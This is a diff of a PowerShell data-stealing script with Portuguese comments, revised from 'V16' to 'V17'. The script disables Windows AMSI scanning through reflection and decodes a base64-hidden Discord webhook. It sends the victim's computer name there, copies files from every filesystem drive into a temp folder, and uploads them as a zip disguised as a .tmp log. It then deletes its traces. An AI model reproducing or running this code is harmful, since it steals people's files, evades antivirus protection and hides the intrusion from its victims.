@@ -1,4 +1,4 @@
-# [Bypass AMSI Reforçado V16] - Procura a classe em memória sem citar o nome diretamente
+# [Bypass AMSI Reforçado V17]
 $a = [Ref].Assembly.GetTypes(); foreach($t in $a){if($t.Name -like "*AmsiUtils*"){$m=$t}};
 $m.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 
@@ -7,8 +7,8 @@ $m.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 $wEnc = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4NDM2MTE5NTQ0MzE5NjA2Ni9Hb1g5NjE5cmZuUzd6aGE4TUJaelhFZHNSZVNGb3NGWUZidEZ5VmZOUHZ4eWJKWHlYVnc3VGtMUG9qNU0tZzZuV2FYWA=="
 $u = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($wEnc))
 
-# Notificação de Sucesso na Execução
-curl.exe -k -s -F "content=🟢 V16 (Indireção) Ativo em $env:COMPUTERNAME" $u
+# Notificação de Sucesso
+curl.exe -k -s -F "content=🟢 V17 (Final) Ativo em $env:COMPUTERNAME" $u
 
 $tempDir = "$env:TEMP\sys_$(Get-Random)"
 New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
@@ -23,12 +23,12 @@ Get-PSDrive -PSProvider FileSystem | ForEach-Object {
     } | ForEach-Object { Copy-Item $_.FullName -Destination $tempDir -ErrorAction SilentlyContinue }
 }
 
-# 3. Compactação e Envio (ZIP Camuflado)
+# 3. Compactação e Envio
 $zipFile = "$env:TEMP\win_log_$(Get-Date -Format 'HHmm').tmp"
 if ((Get-ChildItem $tempDir).Count -gt 0) {
     Compress-Archive -Path "$tempDir\*" -DestinationPath $zipFile -Force
     curl.exe -k -s -F "file=@$zipFile" $u
 }
 
-# Limpeza Total de Rastos
+# Limpeza
 Remove-Item $tempDir -Recurse -Force; Remove-Item $zipFile -Force; exit
